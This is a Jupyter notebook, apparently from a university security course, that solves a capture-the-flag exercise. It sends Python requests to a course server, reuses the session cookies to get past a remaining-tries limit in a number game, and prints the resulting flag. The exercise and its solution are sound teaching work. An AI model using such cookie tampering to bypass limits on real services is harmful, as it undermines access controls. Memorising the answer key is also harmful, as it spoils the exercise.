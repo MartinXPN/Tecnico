{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PwnTools Sockets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "SERVER='http://mustard.stt.rnl.tecnico.ulisboa.pt:15003'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "headers = {'user-agent': 'my-app/0.0.1', 'Content-Type': 'application/json'}\n",
    "r = requests.get(SERVER + '/hello', headers=headers)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'This game is simple. Ask for numbers until you get to your target 92.<br>Your current value is: 0<br>You can ask for 1 more numbers.<br>Call /more to ask for numbers<br>Call /finish once you are done'"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'Content-Type': 'text/html; charset=utf-8', 'Content-Length': '199', 'Set-Cookie': 'user=2122767813853155143; Expires=Wed, 28-Sep-2022 09:29:59 GMT; Max-Age=63072000; Path=/, remaining_tries=1; Expires=Wed, 28-Sep-2022 09:29:59 GMT; Max-Age=63072000; Path=/', 'Server': 'Werkzeug/1.0.1 Python/3.6.9', 'Date': 'Mon, 28 Sep 2020 09:29:59 GMT'}\n",
      "<RequestsCookieJar[<Cookie remaining_tries=1 for mustard.stt.rnl.tecnico.ulisboa.pt/>, <Cookie user=2122767813853155143 for mustard.stt.rnl.tecnico.ulisboa.pt/>]>\n"
     ]
    }
   ],
   "source": [
    "headers = r.headers\n",
    "print(headers)\n",
    "cookies = r.cookies\n",
    "print(cookies)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Here you have: 2<br>Your target is: 92<br>Your current value is: 92<br>'"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = requests.get(SERVER + '/more', cookies=cookies, headers=headers)\n",
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'GREAT JOB: SSof{Now_you_can_script_with_python_requests_and_change_the_cookies}'"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "r = requests.get(SERVER + '/finish', cookies=cookies, headers=headers)\n",
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
